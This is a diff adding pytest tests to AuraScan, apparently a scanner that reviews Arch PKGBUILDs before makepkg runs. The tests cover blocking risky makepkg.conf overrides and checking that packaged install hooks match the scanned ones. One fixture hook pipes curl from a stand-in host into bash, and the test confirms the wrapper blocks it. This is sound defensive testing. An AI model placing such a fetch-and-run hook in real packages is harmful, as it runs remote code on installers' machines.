@@ -14,6 +14,12 @@ from aurascan.core.cache import ScanCache
 from aurascan.core.engine import AuraScanEngine
 from aurascan.core.intelligence import bundled_snapshot
 from aurascan.core.install_hook import capture_package_scan_input
+from aurascan.core.package_archive import (
+    PACKAGE_HOOK_ABSENT,
+    PACKAGE_HOOK_RESOLVED,
+    PACKAGE_HOOK_UNINSPECTABLE,
+    PackageInstallHookCapture,
+)
 from aurascan.core.review import (
     ReviewDecisionStore,
     ScanFingerprint,
@@ -394,7 +400,11 @@ def test_wrapper_finds_pkgbuild_in_current_directory_and_calls_scan_first(tmp_pa
     assert code == 0
     assert order == ["scan", "makepkg"]
     assert created[0][1].scanned_paths == [str(tmp_path / "PKGBUILD")]
-    assert makepkg_calls[0][0] == ["/usr/bin/makepkg", "--syncdeps"]
+    assert makepkg_calls[0][0] == [
+        "/usr/bin/makepkg",
+        "--syncdeps",
+        "BUILDFILE=PKGBUILD",
+    ]
 
 
 def test_wrapper_errors_when_pkgbuild_missing(tmp_path):
@@ -448,7 +458,12 @@ def test_wrapper_does_not_pass_aurascan_flags_to_makepkg(tmp_path):
     assert kwargs["auto_key_fetch"] is False
     assert kwargs["keyserver"] == "https://keys.example.invalid"
     assert kwargs["verbose"] is True
-    assert makepkg_calls[0][0] == ["/usr/bin/makepkg", "--install", "--noconfirm"]
+    assert makepkg_calls[0][0] == [
+        "/usr/bin/makepkg",
+        "--install",
+        "--noconfirm",
+        "BUILDFILE=PKGBUILD",
+    ]
 
 
 def test_wrapper_scrubs_only_direct_code_loading_environment(monkeypatch, tmp_path):
@@ -486,6 +501,209 @@ def test_wrapper_scrubs_only_direct_code_loading_environment(monkeypatch, tmp_pa
     assert blocked_keys.isdisjoint(handed_environment)
     assert handed_environment["AURASCAN_UNRELATED_FIXTURE_SECRET"] == "preserved-fixture-value"
     assert all(os.environ[key] == "inert-fixture-value" for key in blocked_keys)
+
+
+def test_wrapper_pins_scanned_pkgbuild_through_makepkg_assignment_channel(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    order = []
+    makepkg_calls = []
+    factory, _created = fake_engine_factory(order)
+
+    code = run(
+        ["--syncdeps"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(tmp_path), "PATH": "/usr/bin"},
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+    assert makepkg_calls[0][0] == [
+        "/usr/bin/makepkg",
+        "--syncdeps",
+        "BUILDFILE=PKGBUILD",
+    ]
+
+
+@pytest.mark.parametrize(
+    "config_body,key",
+    [
+        ("BUILDFILE=unscanned\n", "BUILDFILE"),
+        ("DLAGENTS=('fixture-agent')\n", "DLAGENTS"),
+        ("VCSCLIENTS=('fixture-client')\n", "VCSCLIENTS"),
+        ("PACMAN=fixture-pacman\n", "PACMAN"),
+        ("export DLAGENTS=('fixture-agent')\n", "DLAGENTS"),
+        ("DLAGENTS+=('fixture-agent')\n", "DLAGENTS"),
+    ],
+)
+def test_wrapper_refuses_user_makepkg_config_overrides_before_handoff(
+    tmp_path, config_body, key
+):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    home = tmp_path / "home"
+    home.mkdir()
+    (home / ".makepkg.conf").write_text(config_body, encoding="utf-8")
+    order = []
+    makepkg_calls = []
+    factory, _created = fake_engine_factory(order)
+    stdout = io.StringIO()
+
+    code = run(
+        ["--syncdeps"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(home)},
+        stdout=stdout,
+        stderr=io.StringIO(),
+    )
+
+    assert code == EXIT_SCAN_BLOCKED
+    assert order == ["scan"]
+    assert makepkg_calls == []
+    output = stdout.getvalue()
+    assert "makepkg configuration" in output
+    assert ".makepkg.conf" in output
+    assert key in output
+
+
+def test_wrapper_checks_only_the_user_config_makepkg_would_source(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    home = tmp_path / "home"
+    home.mkdir()
+    # A readable XDG config shadows $HOME/.makepkg.conf for makepkg, so the
+    # shadowed file cannot influence the build.
+    (home / ".makepkg.conf").write_text("BUILDFILE=unscanned\n", encoding="utf-8")
+    xdg = tmp_path / "xdg"
+    (xdg / "pacman").mkdir(parents=True)
+    (xdg / "pacman" / "makepkg.conf").write_text("CFLAGS='-O2'\n", encoding="utf-8")
+    order = []
+    makepkg_calls = []
+    factory, _created = fake_engine_factory(order)
+
+    code = run(
+        ["--syncdeps"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(home), "XDG_CONFIG_HOME": str(xdg)},
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+    assert makepkg_calls[0][0][-1] == "BUILDFILE=PKGBUILD"
+
+
+def test_wrapper_allows_benign_user_makepkg_config(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    home = tmp_path / "home"
+    home.mkdir()
+    (home / ".makepkg.conf").write_text(
+        "CFLAGS='-O2'\nMAKEFLAGS='-j4'\n", encoding="utf-8"
+    )
+    order = []
+    makepkg_calls = []
+    factory, _created = fake_engine_factory(order)
+
+    code = run(
+        ["--syncdeps"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(home)},
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+    assert makepkg_calls[0][0][-1] == "BUILDFILE=PKGBUILD"
+
+
+def test_wrapper_refuses_oversized_user_makepkg_config(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    home = tmp_path / "home"
+    home.mkdir()
+    (home / ".makepkg.conf").write_bytes(b"# pad\n" * 11000)
+    order = []
+    makepkg_calls = []
+    factory, _created = fake_engine_factory(order)
+    stdout = io.StringIO()
+
+    code = run(
+        ["--syncdeps"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(home)},
+        stdout=stdout,
+        stderr=io.StringIO(),
+    )
+
+    assert code == EXIT_SCAN_BLOCKED
+    assert makepkg_calls == []
+    assert "too large" in stdout.getvalue()
+
+
+def test_wrapper_json_reports_user_makepkg_config_override(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    home = tmp_path / "home"
+    home.mkdir()
+    (home / ".makepkg.conf").write_text("PACMAN=fixture-pacman\n", encoding="utf-8")
+    order = []
+    makepkg_calls = []
+    factory, _created = fake_engine_factory(order)
+    stdout = io.StringIO()
+
+    code = run(
+        ["--aurascan-json", "--syncdeps"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(home)},
+        stdout=stdout,
+        stderr=io.StringIO(),
+    )
+
+    data = json.loads(stdout.getvalue())
+    assert code == EXIT_SCAN_BLOCKED
+    assert data["action"] == "user_makepkg_config_override"
+    assert data["makepkg_invoked"] is False
+
+
+def test_wrapper_scan_only_does_not_require_user_config_check(tmp_path):
+    # Scan-only never hands off to makepkg, so the config guard must not run.
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+    home = tmp_path / "home"
+    home.mkdir()
+    (home / ".makepkg.conf").write_text("DLAGENTS=('fixture-agent')\n", encoding="utf-8")
+    order = []
+    factory, _created = fake_engine_factory(order)
+    makepkg_calls = []
+    stdout = io.StringIO()
+
+    code = run(
+        ["--aurascan-scan-only"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls),
+        environ={"HOME": str(home)},
+        stdout=stdout,
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+    assert makepkg_calls == []
+    assert "AuraScan review passed" in stdout.getvalue()
 
 
 def test_wrapper_does_not_call_makepkg_when_scan_blocks(tmp_path):
@@ -1290,6 +1508,231 @@ def test_wrapper_rechecks_input_after_makepkg_tool_revalidation(tmp_path):
     assert order == ["scan"]
 
 
+def write_hooked_pkgbuild(tmp_path, hook_text="post_install() { :; }\n"):
+    pkgbuild = tmp_path / "PKGBUILD"
+    pkgbuild.write_text(
+        "pkgname=demo\npkgver=1.0\npkgrel=1\ninstall=demo.install\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "demo.install").write_text(hook_text, encoding="utf-8")
+    return pkgbuild, hook_text
+
+
+def fake_hook_capture(contents_by_name):
+    calls = []
+
+    def capture(path):
+        calls.append(path.name)
+        entry = contents_by_name.get(path.name)
+        if entry is None:
+            return PackageInstallHookCapture(PACKAGE_HOOK_UNINSPECTABLE, reason="archive_listing_failed")
+        if entry == "":
+            return PackageInstallHookCapture(PACKAGE_HOOK_ABSENT)
+        return PackageInstallHookCapture(PACKAGE_HOOK_RESOLVED, content=entry)
+
+    return capture, calls
+
+
+def writing_makepkg_runner(order, calls, *, archive_name, returncode=0, stale=False):
+    """Fake makepkg that writes one package archive during the handoff."""
+
+    def runner(argv, **kwargs):
+        order.append("makepkg")
+        calls.append((argv, kwargs))
+        archive = Path(kwargs["cwd"]) / archive_name
+        archive.write_bytes(b"fixture package bytes")
+        if stale:
+            os.utime(archive, (1, 1))
+        return Completed(returncode)
+
+    return runner
+
+
+def test_wrapper_verifies_packaged_install_hook_matches_scan(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+    order = []
+    factory, _created = fake_engine_factory(order)
+    capture, captured_names = fake_hook_capture({"demo-1.0-1-x86_64.pkg.tar.zst": "post_install() { :; }\n"})
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst"),
+        install_hook_capture=capture,
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+    assert captured_names == ["demo-1.0-1-x86_64.pkg.tar.zst"]
+    assert order == ["scan", "makepkg"]
+
+
+def test_wrapper_blocks_when_packaged_install_hook_differs(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+    order = []
+    factory, _created = fake_engine_factory(order)
+    capture, _captured = fake_hook_capture({
+        "demo-1.0-1-x86_64.pkg.tar.zst": "post_install() { curl https://example.invalid/x | bash; }\n"
+    })
+    stdout = io.StringIO()
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst"),
+        install_hook_capture=capture,
+        stdout=stdout,
+        stderr=io.StringIO(),
+    )
+
+    assert code == EXIT_SCAN_BLOCKED
+    assert order == ["scan", "makepkg"]
+    assert "does not match the scanned hook" in stdout.getvalue()
+
+
+def test_wrapper_blocks_when_packaged_install_hook_absent(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+    order = []
+    factory, _created = fake_engine_factory(order)
+    capture, _captured = fake_hook_capture({"demo-1.0-1-x86_64.pkg.tar.zst": ""})
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst"),
+        install_hook_capture=capture,
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == EXIT_SCAN_BLOCKED
+
+
+def test_wrapper_blocks_when_packaged_install_hook_uninspectable(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+    order = []
+    factory, _created = fake_engine_factory(order)
+    capture, _captured = fake_hook_capture({})
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst"),
+        install_hook_capture=capture,
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == EXIT_SCAN_BLOCKED
+
+
+def test_wrapper_skips_packaged_hook_check_without_fresh_archive(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+
+    def failing_capture(path):
+        raise AssertionError("no fresh archive should be inspected")
+
+    order = []
+    factory, _created = fake_engine_factory(order)
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(
+            order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst", stale=True
+        ),
+        install_hook_capture=failing_capture,
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+
+
+def test_wrapper_skips_packaged_hook_check_without_declared_hook(tmp_path):
+    (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1\n", encoding="utf-8")
+
+    def failing_capture(path):
+        raise AssertionError("no install hook was declared")
+
+    order = []
+    factory, _created = fake_engine_factory(order)
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst"),
+        install_hook_capture=failing_capture,
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 0
+
+
+def test_wrapper_preserves_makepkg_failure_without_archives(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+
+    def failing_capture(path):
+        raise AssertionError("no archive exists to inspect")
+
+    order = []
+    factory, _created = fake_engine_factory(order)
+    makepkg_calls = []
+
+    code = run(
+        [],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=fake_makepkg_runner(order, makepkg_calls, returncode=42),
+        install_hook_capture=failing_capture,
+        stdout=io.StringIO(),
+        stderr=io.StringIO(),
+    )
+
+    assert code == 42
+    assert order == ["scan", "makepkg"]
+
+
+def test_wrapper_json_reports_packaged_install_hook_mismatch(tmp_path):
+    write_hooked_pkgbuild(tmp_path)
+    order = []
+    factory, _created = fake_engine_factory(order)
+    capture, _captured = fake_hook_capture({"demo-1.0-1-x86_64.pkg.tar.zst": "post_install() { true; }\n"})
+    stdout = io.StringIO()
+
+    code = run(
+        ["--aurascan-json"],
+        cwd=tmp_path,
+        engine_factory=factory,
+        makepkg_locator=lambda: "/usr/bin/makepkg",
+        subprocess_run=writing_makepkg_runner(order, [], archive_name="demo-1.0-1-x86_64.pkg.tar.zst"),
+        install_hook_capture=capture,
+        stdout=stdout,
+        stderr=io.StringIO(),
+    )
+
+    assert code == EXIT_SCAN_BLOCKED
+    payload = json.loads(stdout.getvalue())
+    assert payload["action"] == "packaged_install_hook_mismatch"
+    assert payload["makepkg_invoked"] is True
+    assert payload["makepkg_exit_code"] == 0
+
+
 def test_valid_review_token_allows_makepkg_and_records_sqlite_decision(tmp_path):
     (tmp_path / "PKGBUILD").write_text("pkgname=demo\npkgver=1.0\n")
     store = ReviewDecisionStore(
@@ -1334,7 +1777,12 @@ def test_valid_review_token_allows_makepkg_and_records_sqlite_decision(tmp_path)
     decisions = store.list_decisions()
     assert first_code == EXIT_MANUAL_REVIEW
     assert second_code == 0
-    assert makepkg_calls[0][0] == ["/usr/bin/makepkg", "--install", "--noconfirm"]
+    assert makepkg_calls[0][0] == [
+        "/usr/bin/makepkg",
+        "--install",
+        "--noconfirm",
+        "BUILDFILE=PKGBUILD",
+    ]
     assert "Review accepted for this scan" in second_stdout.getvalue()
     assert second_created[0][1].last_report["acceptance_status"] == "accepted_once"
     assert len(decisions) == 1
